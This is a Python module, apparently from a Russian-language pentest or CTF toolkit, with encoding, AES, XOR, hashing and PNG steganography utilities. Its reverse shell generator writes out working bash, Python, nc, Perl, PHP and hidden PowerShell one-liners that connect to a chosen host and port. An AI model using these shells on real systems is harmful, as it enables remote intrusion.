"""Утилиты: encode/decode, AES, XOR, хеши файлов, reverse shell, steganography."""
import base64
import hashlib
import os
import urllib.parse
import codecs
from pathlib import Path

from cryptography.fernet import Fernet
from rich.console import Console
from rich.prompt import Prompt
from rich.table import Table

from core.database import db
from core.logger import get_logger

console = Console()
log = get_logger(__name__)


# ----------------------- Encoder / Decoder -----------------------

def b64_encode(s: str) -> str:
    """Base64-кодирование строки."""
    return base64.b64encode(s.encode()).decode()


def b64_decode(s: str) -> str:
    """Base64-декодирование строки."""
    return base64.b64decode(s.encode()).decode(errors="ignore")


def _hex_encode(s: str) -> str:
    return s.encode().hex()


def _hex_decode(s: str) -> str:
    return bytes.fromhex(s).decode(errors="ignore")


def _url_encode(s: str) -> str:
    return urllib.parse.quote(s)


def _url_decode(s: str) -> str:
    return urllib.parse.unquote(s)


def _rot13(s: str) -> str:
    return codecs.encode(s, "rot_13")


def _binary_encode(s: str) -> str:
    return " ".join(format(b, "08b") for b in s.encode())


def _binary_decode(s: str) -> str:
    return "".join(chr(int(b, 2)) for b in s.split())


ENCODERS = {
    "base64-encode": b64_encode,
    "base64-decode": b64_decode,
    "hex-encode": _hex_encode,
    "hex-decode": _hex_decode,
    "url-encode": _url_encode,
    "url-decode": _url_decode,
    "rot13": _rot13,
    "binary-encode": _binary_encode,
    "binary-decode": _binary_decode,
}


def encoder_decoder() -> None:
    """Интерактивный encoder/decoder."""
    table = Table(title="Encoder/Decoder")
    table.add_column("№")
    table.add_column("Операция")
    ops = list(ENCODERS.keys())
    for i, name in enumerate(ops, 1):
        table.add_row(str(i), name)
    console.print(table)
    c = Prompt.ask("Выбор", choices=[str(i) for i in range(1, len(ops) + 1)])
    data = Prompt.ask("Данные")
    try:
        result = ENCODERS[ops[int(c) - 1]](data)
        console.print(f"[green]{result}[/green]")
        db.save_scan(
            "encode",
            ops[int(c) - 1],
            {"input": data[:20], "output": result[:64]},
        )
    except Exception as exc:  # noqa: BLE001
        console.print(f"[red]Ошибка: {exc}[/red]")


# ----------------------- AES (Fernet) -----------------------

def aes_encrypt_decrypt() -> None:
    """AES (Fernet) шифрование/дешифрование строки."""
    action = Prompt.ask("Действие", choices=["encrypt", "decrypt"])
    if action == "encrypt":
        key = Fernet.generate_key()
        data = Prompt.ask("Текст").encode()
        token = Fernet(key).encrypt(data)
        console.print(f"[cyan]Key:[/cyan] {key.decode()}")
        console.print(f"[green]Ciphertext:[/green] {token.decode()}")
        db.save_scan("aes_enc", data[:20].decode(errors="ignore"),
                     {"key": key.decode(), "ct": token.decode()})
    else:
        key = Prompt.ask("Key").encode()
        token = Prompt.ask("Ciphertext").encode()
        try:
            plain = Fernet(key).decrypt(token).decode()
            console.print(f"[green]{plain}[/green]")
            db.save_scan("aes_dec", token[:20].decode(errors="ignore"),
                         {"plain": plain})
        except Exception as exc:  # noqa: BLE001
            console.print(f"[red]Ошибка: {exc}[/red]")


# ----------------------- XOR -----------------------

def xor_cipher() -> None:
    """XOR-шифр с одним байтом-ключом."""
    data = Prompt.ask("Данные").encode()
    key = Prompt.ask("Ключ (число 0-255)", default="42")
    try:
        k = int(key) & 0xFF
        out = bytes(b ^ k for b in data)
        console.print(f"[green]{out.hex()}[/green]")
        db.save_scan("xor", key, {"input": data[:20].decode(errors="ignore"),
                                   "hex": out.hex()})
    except ValueError:
        console.print("[red]Ключ должен быть числом.[/red]")


def xor_decrypt() -> None:
    """Обратный XOR: hex + ключ → текст."""
    hex_data = Prompt.ask("Hex-данные")
    key = Prompt.ask("Ключ (число 0-255)", default="42")
    try:
        k = int(key) & 0xFF
        data = bytes.fromhex(hex_data)
        out = bytes(b ^ k for b in data).decode(errors="ignore")
        console.print(f"[green]{out}[/green]")
    except ValueError as exc:
        console.print(f"[red]Ошибка: {exc}[/red]")


# ----------------------- File hashes -----------------------

def file_hashes(path: str) -> None:
    """Хеши файла или всех файлов в папке (MD5 + SHA256)."""
    p = Path(path)
    if not p.exists():
        console.print("[red]Путь не найден.[/red]")
        return
    files = [p] if p.is_file() else [f for f in p.rglob("*") if f.is_file()]
    if not files:
        console.print("[yellow]Файлов нет.[/yellow]")
        return
    table = Table(title=f"Хеши ({len(files)} файлов)")
    table.add_column("Файл", style="cyan")
    table.add_column("MD5")
    table.add_column("SHA256")
    for f in files:
        md5 = hashlib.md5()
        sha = hashlib.sha256()
        try:
            with f.open("rb") as fh:
                for chunk in iter(lambda: fh.read(8192), b""):
                    md5.update(chunk)
                    sha.update(chunk)
        except Exception as exc:  # noqa: BLE001
            table.add_row(str(f.name), f"[red]err[/red]", str(exc)[:40])
            continue
        table.add_row(str(f.name), md5.hexdigest()[:16], sha.hexdigest()[:24])
    console.print(table)
    db.save_scan("filehash", str(p), {"count": len(files)})


# ----------------------- Reverse shell -----------------------

def reverse_shell_generator() -> None:
    """Генератор reverse shell (для CTF/лабораторий)."""
    lhost = Prompt.ask("LHOST")
    lport = Prompt.ask("LPORT", default="4444")
    shells = {
        "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "python3": (
            f"python3 -c 'import socket,subprocess,os;"
            f"s=socket.socket();s.connect((\"{lhost}\",{lport}));"
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
            f"os.dup2(s.fileno(),2);"
            f"subprocess.call([\"/bin/sh\",\"-i\"])'"
        ),
        "nc": f"nc -e /bin/sh {lhost} {lport}",
        "perl": (
            f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
            f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            f"if(connect(S,sockaddr_in($p,inet_aton($i))))"
            f"{{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
            f"exec(\"/bin/sh -i\");}};'"
        ),
        "php": (
            f"php -r '$sock=fsockopen(\"{lhost}\",{lport});"
            f"exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        ),
        "powershell": (
            f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
            f"New-Object System.Net.Sockets.TCPClient('{lhost}',{lport})"
        ),
    }
    for name, cmd in shells.items():
        console.print(f"[cyan]{name}:[/cyan]")
        console.print(f"  [green]{cmd}[/green]")
    db.save_scan("revshell", f"{lhost}:{lport}", list(shells.keys()))


# ----------------------- Steganography (LSB PNG) -----------------------

def _text_to_bits(text: str) -> str:
    """Текст → строка бит + маркер конца (8 нулей)."""
    data = text.encode("utf-8")
    bits = "".join(f"{b:08b}" for b in data)
    return bits + "00000000"  # нулевой байт — маркер конца


def _bits_to_text(bits: str) -> str:
    """Биты → текст (до маркера)."""
    out_bytes = bytearray()
    for i in range(0, len(bits) - 7, 8):
        chunk = bits[i:i + 8]
        if len(chunk) < 8:
            break
        val = int(chunk, 2)
        if val == 0:
            break
        out_bytes.append(val)
    return out_bytes.decode("utf-8", errors="ignore")


def stego_hide(image_path: str, text: str, out_path: str) -> None:
    """Скрыть текст в PNG через LSB."""
    try:
        from PIL import Image
    except ImportError:
        console.print("[red]Pillow не установлен.[/red]")
        return

    src = Path(image_path)
    if not src.exists():
        console.print("[red]Файл-источник не найден.[/red]")
        return

    img = Image.open(src).convert("RGB")
    pixels = list(img.getdata())
    bits = _text_to_bits(text)
    capacity = len(pixels) * 3  # по 1 биту на канал
    if len(bits) > capacity:
        console.print(
            f"[red]Недостаточно места: нужно {len(bits)} бит, "
            f"есть {capacity}.[/red]"
        )
        return

    new_pixels = []
    bit_idx = 0
    for r, g, b in pixels:
        if bit_idx < len(bits):
            r = (r & ~1) | int(bits[bit_idx]); bit_idx += 1
        if bit_idx < len(bits):
            g = (g & ~1) | int(bits[bit_idx]); bit_idx += 1
        if bit_idx < len(bits):
            b = (b & ~1) | int(bits[bit_idx]); bit_idx += 1
        new_pixels.append((r, g, b))

    out = Image.new("RGB", img.size)
    out.putdata(new_pixels)
    out.save(out_path, "PNG")
    console.print(f"[green]✓ Текст скрыт в {out_path} "
                  f"({len(bits)} бит)[/green]")
    db.save_scan("stego_hide", str(src), {"out": out_path,
                                           "bits": len(bits)})


def stego_extract(image_path: str) -> None:
    """Извлечь скрытый текст из PNG (LSB)."""
    try:
        from PIL import Image
    except ImportError:
        console.print("[red]Pillow не установлен.[/red]")
        return

    p = Path(image_path)
    if not p.exists():
        console.print("[red]Файл не найден.[/red]")
        return

    img = Image.open(p).convert("RGB")
    bits: list[str] = []
    for r, g, b in img.getdata():
        bits.append(str(r & 1))
        bits.append(str(g & 1))
        bits.append(str(b & 1))
    text = _bits_to_text("".join(bits))
    if text:
        console.print(f"[green]{text}[/green]")
        db.save_scan("stego_extract", str(p), {"text": text[:200]})
    else:
        console.print("[yellow]Скрытого текста не найдено.[/yellow]")


# ----------------------- Меню -----------------------

def menu() -> None:
    """Меню утилит."""
    table = Table(title="[bold]Утилиты[/bold]")
    table.add_column("№", style="yellow")
    table.add_column("Опция")
    opts = [
        ("1", "Encoder/Decoder (base64, hex, url, rot13, binary)"),
        ("2", "AES (Fernet) encrypt/decrypt"),
        ("3", "XOR-шифр (шифрование)"),
        ("4", "XOR-дешифрование"),
        ("5", "Хеши файла/папки"),
        ("6", "Reverse shell generator (CTF)"),
        ("7", "Скрыть текст в PNG (LSB-stego)"),
        ("8", "Извлечь текст из PNG (LSB-stego)"),
    ]
    for n, t in opts:
        table.add_row(n, t)
    console.print(table)
    c = Prompt.ask("Выбор", choices=[o[0] for o in opts])
    if c == "1":
        encoder_decoder()
    elif c == "2":
        aes_encrypt_decrypt()
    elif c == "3":
        xor_cipher()
    elif c == "4":
        xor_decrypt()
    elif c == "5":
        file_hashes(Prompt.ask("Путь"))
    elif c == "6":
        reverse_shell_generator()
    elif c == "7":
        img = Prompt.ask("Исходное изображение (PNG)")
        txt = Prompt.ask("Текст")
        out = Prompt.ask("Куда сохранить (PNG)",
                         default="stego_out.png")
        stego_hide(img, txt, out)
    elif c == "8":
        stego_extract(Prompt.ask("PNG-файл"))